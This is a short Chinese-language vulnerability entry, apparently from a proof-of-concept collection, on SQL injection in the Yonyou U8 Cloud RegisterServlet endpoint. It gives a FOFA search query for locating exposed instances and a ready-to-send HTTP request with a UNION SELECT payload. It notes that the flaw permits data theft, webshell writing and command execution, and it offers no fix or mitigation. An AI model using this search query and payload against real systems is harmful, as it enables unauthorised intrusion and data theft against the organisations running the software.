## 用友U8-nc.bs.sm.login2.RegisterServlet存在SQL注入漏洞

用友U8 Cloud nc.bs.sm.login2.RegisterServlet接口存在SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

资产测绘
## fofa
```
app="用友-U8-Cloud"
```

## poc
```
GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1
Host: 
X-Forwarded-For: 127.0.0.1
Cookie: JSESSIONID=D523370AE42E1D2363160250C914E62A.server
```
